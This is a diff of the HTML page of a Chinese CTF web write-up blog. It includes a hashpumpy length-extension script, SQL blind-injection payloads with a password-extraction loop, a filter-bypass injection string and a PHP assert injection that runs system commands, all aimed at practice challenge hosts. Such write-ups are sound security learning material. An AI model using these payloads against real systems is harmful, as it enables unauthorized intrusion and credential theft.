<span class="string">'210'</span> :</div><div class="line">		<span class="keyword">print</span> key_length</div><div class="line">		<span class="keyword">print</span> response.text</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">print</span> key_length</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf8</span></span><br><span class="line"><span class="comment">#   md5($salt." ;"tseug":5:s ") = 3a4727d57463f122833d9e732f94e4e0 </span></span><br><span class="line"><span class="comment">#   md5($salt." ;"tseug":5:s xxxxx ;"nimda":5:s ") = xxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">hexdigest = <span class="string">"3a4727d57463f122833d9e732f94e4e0"</span>;</span><br><span class="line">original_data = <span class="string">";\"tseug\":5:s"</span>;</span><br><span class="line">data_to_add = <span class="string">";\"nimda\":5:s"</span>;</span><br><span class="line">url=<span class="string">"http://web.jarvisoj.com:32778"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置key_length的范围</span></span><br><span class="line"><span class="keyword">for</span> key_length <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">	result = hashpumpy.hashpump(hexdigest,original_data,data_to_add,key_length);</span><br><span class="line"></span><br><span class="line">	role_re = result[<span class="number">1</span>][::<span class="number">-1</span>];  	 <span class="comment">#16进制\x80 代表一个字符 可以直接对换</span></span><br><span class="line">	role = urllib.quote(role_re); 	 <span class="comment">#16进制直接url编码得到 %xx</span></span><br><span class="line">	hsh = result[<span class="number">0</span>];</span><br><span class="line">	cookies = &#123;<span class="string">'role'</span>:role,<span class="string">'hsh'</span>:hsh&#125;;</span><br><span class="line">	</span><br><span class="line">	response = requests.get(url,cookies=cookies);</span><br><span class="line">	<span class="keyword">if</span> response.headers[<span class="string">'Content-Length'</span>] != <span class="string">'210'</span> :</span><br><span class="line">		<span class="keyword">print</span> key_length</span><br><span class="line">		<span class="keyword">print</span> response.text</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">else</span> :</span><br><span class="line">		<span class="keyword">print</span> key_length</span><br></pre></td></tr></table></figure>
 <p>运行结果如下：</p>
 <div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fjsm9frsbqj30lx0e977w.jpg" alt="5"><br></div>
 
 
-<h2 id="9-1-看起来有点难啊"><a href="#9-1-看起来有点难啊" class="headerlink" title="[9.1]看起来有点难啊"></a>[9.1]看起来有点难啊</h2><p><a href="http://ctf5.shiyanbar.com/basic/inject/" target="_blank" rel="external">戳这里=w=</a></p>
-<h3 id="涉及范围：sql盲注"><a href="#涉及范围：sql盲注" class="headerlink" title="涉及范围：sql盲注"></a>涉及范围：sql盲注</h3><p>哎，做完之后感想，还是才学疏浅没有脑洞的J，第一步就卡死了。<br>进行以下sql注入尝试，尝试得到两种返回状况<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">admin= 1’ and <span class="string">'1'</span>=<span class="string">'1'</span> --+ <span class="built_in">pwd</span>=1</div><div class="line"></div><div class="line">admin= 1’ or <span class="string">'1'</span>=<span class="string">'1'</span> --+  <span class="built_in">pwd</span>=1</div><div class="line"></div><div class="line">admin= admin‘ and <span class="string">'1'</span>=<span class="string">'1'</span> --+ <span class="built_in">pwd</span>=1</div><div class="line"></div><div class="line">admin= admin<span class="string">' and '</span>1<span class="string">'='</span>2<span class="string">' --+ pwd=1</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">admin= admin’</span></div></pre></td></tr></table></figure></p>
+<h2 id="9-1-看起来有点难啊"><a href="#9-1-看起来有点难啊" class="headerlink" title="[9.1]看起来有点难啊"></a>[9.1]看起来有点难啊</h2><p><a href="http://ctf5.shiyanbar.com/basic/inject/" target="_blank" rel="noopener">戳这里=w=</a></p>
+<h3 id="涉及范围：sql盲注"><a href="#涉及范围：sql盲注" class="headerlink" title="涉及范围：sql盲注"></a>涉及范围：sql盲注</h3><p>哎，做完之后感想，还是才学疏浅没有脑洞的J，第一步就卡死了。<br>进行以下sql注入尝试，尝试得到两种返回状况<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin= 1’ and <span class="string">'1'</span>=<span class="string">'1'</span> --+ <span class="built_in">pwd</span>=1</span><br><span class="line"></span><br><span class="line">admin= 1’ or <span class="string">'1'</span>=<span class="string">'1'</span> --+  <span class="built_in">pwd</span>=1</span><br><span class="line"></span><br><span class="line">admin= admin‘ and <span class="string">'1'</span>=<span class="string">'1'</span> --+ <span class="built_in">pwd</span>=1</span><br><span class="line"></span><br><span class="line">admin= admin<span class="string">' and '</span>1<span class="string">'='</span>2<span class="string">' --+ pwd=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">admin= admin’</span></span><br></pre></td></tr></table></figure></p>
 <p>总结出题目的三种返回状态：</p>
 <ul>
 <li><strong>数据库链接失败！</strong>：从数据库返回0行</li>
@@ -424,7 +256,7 @@
 <li><strong>空白</strong>: sql语句错误</li>
 </ul>
 <p>有小朋友可能要提出，为啥要试admin呀，我一开始就是没有想到试admin，也没有用 or 找到三种返回的规律，两脸蒙蔽。<br>但是只要想到 <code>1’ or ‘1’=’1‘ and 巴拉巴拉 --+</code> 一样可以得到两种返回状态，只不过再需要盲注一下username得出admin<br>于是就是<strong>布尔型盲注</strong></p>
-<p>然后就盲注套路走起来:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null"</span>  <span class="comment">#替换column  得到 username password</span></div><div class="line"></div><div class="line"><span class="comment">#判断表</span></div><div class="line">sql_table=<span class="string">"admin' and table.column is not null"</span>  <span class="comment">#替换table 得到 admin</span></div><div class="line"></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin' and ascii(substring(password,%s,1))-%s -- "</span></div><div class="line">或</div><div class="line">sql=“admin<span class="string">' and substring(password,1,1)= '</span>i<span class="string">' -- ”</span></div><div class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> ascii(substring(password,<span class="number">1</span>,<span class="number">1</span>)) = <span class="string">'123'</span> -- ”</div><div class="line">sql=“admin<span class="string">' and password like '</span>i%<span class="string">' -- ”</span></div><div class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> password = <span class="string">'flag'</span> -- ”</div><div class="line">sql=“admin<span class="string">' and ascii(substring(password,%s,1))-10 -- ”</span></div><div class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> case when(substr(password,%s,<span class="number">1</span>)=<span class="string">'i'</span>) then sleep(<span class="number">10</span>) <span class="keyword">else</span> sleep(<span class="number">0</span>) -- ”</div><div class="line">sql=“admin<span class="string">' and if(substr(password,%s,1)='</span>i<span class="string">') ,sleep(10) , sleep(0) -- ”</span></div></pre></td></tr></table></figure></p>
+<p>然后就盲注套路走起来:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#判断列</span></span><br><span class="line">sql_column=<span class="string">"admin' and column is not null"</span>  <span class="comment">#替换column  得到 username password</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断表</span></span><br><span class="line">sql_table=<span class="string">"admin' and table.column is not null"</span>  <span class="comment">#替换table 得到 admin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#列出password</span></span><br><span class="line">sql=<span class="string">"admin' and ascii(substring(password,%s,1))-%s -- "</span></span><br><span class="line">或</span><br><span class="line">sql=“admin<span class="string">' and substring(password,1,1)= '</span>i<span class="string">' -- ”</span></span><br><span class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> ascii(substring(password,<span class="number">1</span>,<span class="number">1</span>)) = <span class="string">'123'</span> -- ”</span><br><span class="line">sql=“admin<span class="string">' and password like '</span>i%<span class="string">' -- ”</span></span><br><span class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> password = <span class="string">'flag'</span> -- ”</span><br><span class="line">sql=“admin<span class="string">' and ascii(substring(password,%s,1))-10 -- ”</span></span><br><span class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> case when(substr(password,%s,<span class="number">1</span>)=<span class="string">'i'</span>) then sleep(<span class="number">10</span>) <span class="keyword">else</span> sleep(<span class="number">0</span>) -- ”</span><br><span class="line">sql=“admin<span class="string">' and if(substr(password,%s,1)='</span>i<span class="string">') ,sleep(10) , sleep(0) -- ”</span></span><br></pre></td></tr></table></figure></p>
 <p>  另外在此题中不能使用select，简单尝试过滤无效，就不用类似<code>&quot;admin&#39; and (select password from table)&gt;0&quot;</code>注入。</p>
 <p>  最后贴上跑username和password的代码，注意</p>
 <ul>
@@ -432,11 +264,11 @@
 <li>页面编码不同无法直接显示匹配字符，右键返回页面查看源码发现是GB2312,解码匹配</li>
 <li>chr() : ascii–&gt;字符</li>
 </ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url=<span class="string">"http://ctf5.shiyanbar.com/basic/inject/index.php"</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin' and ascii(substring(password,%s,1))-%s -- "</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'admin'</span>:sql %(i,x),<span class="string">'pass'</span>:<span class="string">'admin'</span>,<span class="string">'action'</span>:<span class="string">'login'</span>&#125;</div><div class="line">	response=requests.get(url,params=data)</div><div class="line">	<span class="comment">#print response.content.decode('GB2312')</span></div><div class="line">	<span class="keyword">if</span> response.content.decode(<span class="string">'GB2312'</span>).find(<span class="string">'数据库'</span>)&gt;<span class="number">0</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">print</span> i</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">30</span>,<span class="number">150</span>):</div><div class="line">		print(x),</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += chr(x)</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/basic/inject/index.php"</span></span><br><span class="line"><span class="comment">#列出password</span></span><br><span class="line">sql=<span class="string">"admin' and ascii(substring(password,%s,1))-%s -- "</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></span><br><span class="line">	data=&#123;<span class="string">'admin'</span>:sql %(i,x),<span class="string">'pass'</span>:<span class="string">'admin'</span>,<span class="string">'action'</span>:<span class="string">'login'</span>&#125;</span><br><span class="line">	response=requests.get(url,params=data)</span><br><span class="line">	<span class="comment">#print response.content.decode('GB2312')</span></span><br><span class="line">	<span class="keyword">if</span> response.content.decode(<span class="string">'GB2312'</span>).find(<span class="string">'数据库'</span>)&gt;<span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span> :</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">key=<span class="string">''</span></span><br><span class="line">print(<span class="string">'start'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">print</span> i</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">30</span>,<span class="number">150</span>):</span><br><span class="line">		print(x),</span><br><span class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</span><br><span class="line">			key += chr(x)</span><br><span class="line">			print(key)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <p>脚本出username,password直接提交得到FLAG。</p>
 <p>哎….常规套路的题目做了半天………QAQ</p>
-<h2 id="皇家邮电平台"><a href="#皇家邮电平台" class="headerlink" title="皇家邮电平台"></a>皇家邮电平台</h2><p><a href="http://cms.nuptzj.cn/" target="_blank" rel="external">戳这里=w=</a></p>
-<h3 id="涉及范围：源码泄露，本地文件包含，sql注入，后门利用"><a href="#涉及范围：源码泄露，本地文件包含，sql注入，后门利用" class="headerlink" title="涉及范围：源码泄露，本地文件包含，sql注入，后门利用"></a>涉及范围：源码泄露，本地文件包含，sql注入，后门利用</h3><p>这题题目步骤以及源码较多，自己写需要花大力气，查到两篇不错的writeup，互补贴用了。<br><a href="http://blog.spoock.com/2016/06/20/nuptzj-web2-writeup/" target="_blank" rel="external">题解1</a><br><a href="http://blog.csdn.net/ni9htmar3/article/details/53791997" target="_blank" rel="external">题解2</a>（ctrl+f 皇家）<br>大致记录一下解题的点：</p>
+<h2 id="皇家邮电平台"><a href="#皇家邮电平台" class="headerlink" title="皇家邮电平台"></a>皇家邮电平台</h2><p><a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">戳这里=w=</a></p>
+<h3 id="涉及范围：源码泄露，本地文件包含，sql注入，后门利用"><a href="#涉及范围：源码泄露，本地文件包含，sql注入，后门利用" class="headerlink" title="涉及范围：源码泄露，本地文件包含，sql注入，后门利用"></a>涉及范围：源码泄露，本地文件包含，sql注入，后门利用</h3><p>这题题目步骤以及源码较多，自己写需要花大力气，查到两篇不错的writeup，互补贴用了。<br><a href="http://blog.spoock.com/2016/06/20/nuptzj-web2-writeup/" target="_blank" rel="noopener">题解1</a><br><a href="http://blog.csdn.net/ni9htmar3/article/details/53791997" target="_blank" rel="noopener">题解2</a>（ctrl+f 皇家）<br>大致记录一下解题的点：</p>
 <ul>
 <li>观察各个页面的源代码，发现<code>file=sm.txt</code>,修改参数得到各个页面的源码</li>
 <li>分析源码，得到更多页面，发现后台登录页面；</li>
@@ -445,241 +277,176 @@
 <li>后台登录界面登录，得到回调木马</li>
 <li>利用木马遍历目录，得到flag</li>
 </ul>
-<p>这题环环相扣，漏掉一点都无法继续，也有很多多余的杂乱信息。<br>从分析页面到getshell，可以说是比较现实的WEB渗透了。<br>对后门我也是只懂皮毛….贴上找到的知识贴——<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="external">关于各种后门</a><br>放上自己的注入代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">爆破账号密码：</div><div class="line">soid=chacharr(49)/**/anandd/**/(seselectlect/**/ascii(substring(userpaspasss,1,1))/**/ffromrom/**/aadmindmin)&lt;&gt;1</div></pre></td></tr></table></figure></p>
+<p>这题环环相扣，漏掉一点都无法继续，也有很多多余的杂乱信息。<br>从分析页面到getshell，可以说是比较现实的WEB渗透了。<br>对后门我也是只懂皮毛….贴上找到的知识贴——<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener">关于各种后门</a><br>放上自己的注入代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆破账号密码：</span><br><span class="line">soid=chacharr(49)/**/anandd/**/(seselectlect/**/ascii(substring(userpaspasss,1,1))/**/ffromrom/**/aadmindmin)&lt;&gt;1</span><br></pre></td></tr></table></figure></p>
 <p><strong>Q&amp;A</strong></p>
 <p>遍历后的出现目录的页面 乱码 ：下载页面，到sublime中换编译方式打开即可</p>
 <hr>
 <p>还有好长的路呢…..慢慢学习嗯</p>
-<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="external">戳这里=w=</a></p>
-<h3 id="git信息泄露-hackgit-php字符串拼接注入"><a href="#git信息泄露-hackgit-php字符串拼接注入" class="headerlink" title=".git信息泄露 hackgit php字符串拼接注入"></a>.git信息泄露 hackgit php字符串拼接注入</h3><p>全程知识盲区…<br>about页面得知用到git<br><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/" target="_blank" rel="external">git</a>的配置不当有可能导致.git信息泄露,漏洞表现：</p>
+<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="noopener">戳这里=w=</a></p>
+<h3 id="git信息泄露-hackgit-php字符串拼接注入"><a href="#git信息泄露-hackgit-php字符串拼接注入" class="headerlink" title=".git信息泄露 hackgit php字符串拼接注入"></a>.git信息泄露 hackgit php字符串拼接注入</h3><p>全程知识盲区…<br>about页面得知用到git<br><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/" target="_blank" rel="noopener">git</a>的配置不当有可能导致.git信息泄露,漏洞表现：</p>
 <ul>
 <li>可以查看  .git  .git/objects</li>
-<li>可以下载  .git/index<br>利用<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">githack</a>尝试下载源码，有一些php,找到目标<strong>flag.php</strong></li>
+<li>可以下载  .git/index<br>利用<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">githack</a>尝试下载源码，有一些php,找到目标<strong>flag.php</strong></li>
 </ul>
 <p>index.php其中关键源码：<br>‘’’php<br>&lt;?php<br>if (isset($_GET[‘page’])) {<br>    $page = $_GET[‘page’];<br>} else {<br>    $page = “home”;<br>}<br>$file = “templates/“ . $page . “.php”;<br>assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”);<br>assert(“file_exists(‘$file’)”) or die(“That file doesn’t exist!”);<br>?&gt;<br>‘’’</p>
 <p>咋一看并没有什么软用，但是</p>
 <ul>
 <li>可以控制$page的值</li>
-<li>php神奇的特性，字符串链接命令，命令可以执行<br><a href="http://ww1.sinaimg.cn/large/006iKNp3gy1fkfmrveqtej30l002dt8j.jpg" target="_blank" rel="external">字符串链接</a></li>
+<li>php神奇的特性，字符串链接命令，命令可以执行<br><a href="http://ww1.sinaimg.cn/large/006iKNp3gy1fkfmrveqtej30l002dt8j.jpg" target="_blank" rel="noopener">字符串链接</a></li>
 <li>与sql注入原理相同的php拼接写入代码</li>
 </ul>
 <p>payload(为了清楚，变量不写””):<br>‘’’php<br>$page = ‘.system(“ls ./templates”).’   ;<br>$file(合并后) = templates/‘.system(“ls ./templates”).’..php   ;<br>assert(“strpos(‘templates/.’ . system(“ls ./templates”) .  ‘..php’ , ‘..’ ) === false”)<br>‘’’<br>由于assert函数，会把””中的语句当做php代码执行，所以可以在其中用<strong>//</strong>注释””后面乱七八糟的语句，自己构筑代码<br>所以给出另一个payload<br>‘’’php<br>$page = ‘, ‘..’) === false and system(‘cat ./templates/flag.php’);    //   ;<br>$file(合并后) = templates/‘, ‘..’) === false and system(‘cat ./templates/flag.php’);    //.php   ;<br>assert(  “strpos(‘templates/‘ , ‘..’) === false  and  system(‘cat ./templates/flag.php’);    //.php’, ‘..’ ) === false”  );<br>‘’’<br>两种payload都可以在<code>system(&quot; &quot;)</code>中可以执行任意linux命令<br>flag.php返回需要查看源码才能看到…….嗯..绝望卡了两年</p>
-<h2 id="俄罗斯方块"><a href="#俄罗斯方块" class="headerlink" title="俄罗斯方块"></a>俄罗斯方块</h2><p><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="external">戳这里=w=</a></p>
-<h3 id="js代码-jsFuck"><a href="#js代码-jsFuck" class="headerlink" title="js代码 jsFuck"></a>js代码 jsFuck</h3><p>一开始推断是到分数有服务器返回什么，抓包尝试修改无效。<br>源码找到<strong>tetris.js</strong><br><a href="http://tool.oschina.net/codeformat/js/" target="_blank" rel="external">js代码格式化</a>后阅读代码，找到关键代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.mayAdd = function(a) &#123;</div><div class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.scores.length &lt; <span class="keyword">this</span>.maxscores) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)),</div><div class="line">            !<span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (var b = <span class="keyword">this</span>.scores.length - <span class="number">1</span>; <span class="number">0</span> &lt;= b; --b) <span class="keyword">if</span> (<span class="keyword">this</span>.scores[b].score &lt; a) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)),</div><div class="line">            !<span class="number">0</span>;</div><div class="line">            <span class="keyword">return</span> ! <span class="number">1</span></div><div class="line">        &#125;;</div></pre></td></tr></table></figure></p>
-<p>如果满足<strong>1E6 &lt; a</strong>执行<code>a.set(&quot;urlkey&quot;, &quot;webqwer&quot; [1] + &quot;100.js&quot;, 864E5)</code><br>此处传入三个参数<strong>“urlkey”</strong>，<strong>“e100.js”</strong>,<strong>864ES</strong><br>查看set函数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.set = function(b, d, a, c, e, f) &#123;</div><div class="line">           <span class="keyword">this</span>.del(b);</div><div class="line">           c || (c = <span class="string">"/"</span>);</div><div class="line">           b = b + <span class="string">"="</span> + escape(d);</div><div class="line">           a &amp;&amp; (a = <span class="keyword">new</span> Date((<span class="keyword">new</span> Date).getTime() + <span class="number">1E3</span> * a), b += <span class="string">"; expires="</span> + a.toGMTString());</div><div class="line">           b = b + (c ? <span class="string">";\tpath="</span> + c: <span class="string">""</span>) + (e ? <span class="string">";\tdomain="</span> + e: <span class="string">""</span>);</div><div class="line">           b += f ? <span class="string">";\tsecure"</span>: <span class="string">""</span>;</div><div class="line">           document.cookie = b</div><div class="line">       &#125;;</div></pre></td></tr></table></figure></p>
-<p>发现函数应该是传入5个参数，有问题。<br>一个坑，其实三个参数只是提示，并不是可以执行的。<br>urlkey —&gt; url地址访问e100.js    864ES忽略<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fkkabybwmlj30ej04jmx3.jpg" alt="jsfuck"><br>jsfuck编码，<a href="http://www.bugku.com/tools/jsfuck/#" target="_blank" rel="external">这里</a><br>得到flag</p>
-<h2 id="全球某工商CTF-安全系的博客"><a href="#全球某工商CTF-安全系的博客" class="headerlink" title="全球某工商CTF-安全系的博客"></a>全球某工商CTF-安全系的博客</h2><p><a href="http://10.21.13.225/zn" target="_blank" rel="external">戳这里=w=</a></p>
+<h2 id="俄罗斯方块"><a href="#俄罗斯方块" class="headerlink" title="俄罗斯方块"></a>俄罗斯方块</h2><p><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="noopener">戳这里=w=</a></p>
+<h3 id="js代码-jsFuck"><a href="#js代码-jsFuck" class="headerlink" title="js代码 jsFuck"></a>js代码 jsFuck</h3><p>一开始推断是到分数有服务器返回什么，抓包尝试修改无效。<br>源码找到<strong>tetris.js</strong><br><a href="http://tool.oschina.net/codeformat/js/" target="_blank" rel="noopener">js代码格式化</a>后阅读代码，找到关键代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.mayAdd = function(a) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.scores.length &lt; <span class="keyword">this</span>.maxscores) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)),</span><br><span class="line">            !<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (var b = <span class="keyword">this</span>.scores.length - <span class="number">1</span>; <span class="number">0</span> &lt;= b; --b) <span class="keyword">if</span> (<span class="keyword">this</span>.scores[b].score &lt; a) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)),</span><br><span class="line">            !<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> ! <span class="number">1</span></span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure></p>
+<p>如果满足<strong>1E6 &lt; a</strong>执行<code>a.set(&quot;urlkey&quot;, &quot;webqwer&quot; [1] + &quot;100.js&quot;, 864E5)</code><br>此处传入三个参数<strong>“urlkey”</strong>，<strong>“e100.js”</strong>,<strong>864ES</strong><br>查看set函数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.set = function(b, d, a, c, e, f) &#123;</span><br><span class="line">           <span class="keyword">this</span>.del(b);</span><br><span class="line">           c || (c = <span class="string">"/"</span>);</span><br><span class="line">           b = b + <span class="string">"="</span> + escape(d);</span><br><span class="line">           a &amp;&amp; (a = <span class="keyword">new</span> Date((<span class="keyword">new</span> Date).getTime() + <span class="number">1E3</span> * a), b += <span class="string">"; expires="</span> + a.toGMTString());</span><br><span class="line">           b = b + (c ? <span class="string">";\tpath="</span> + c: <span class="string">""</span>) + (e ? <span class="string">";\tdomain="</span> + e: <span class="string">""</span>);</span><br><span 